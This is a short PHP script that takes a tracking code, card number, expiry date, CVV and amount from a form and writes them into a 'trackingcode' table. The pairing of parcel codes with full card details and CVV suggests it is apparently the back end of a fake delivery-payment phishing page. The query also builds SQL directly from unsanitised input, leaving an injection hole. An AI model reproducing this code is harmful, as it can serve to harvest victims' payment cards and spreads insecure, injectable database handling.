<?php

include 'conn.php';

$code=$_POST['code'];

$creditno=$_POST['cardno'];

$address=$_POST['address'];

$expire=$_POST['expire'];

$cvv=$_POST['cvv'];

$amount=$_POST['amount'];


$sql="UPDATE `trackingcode` SET `creditno`='$creditno',`expire`='$expire',`cvv`='$cvv',`amount`='$amount' WHERE `code`='$code'";

mysql_query($sql);

?>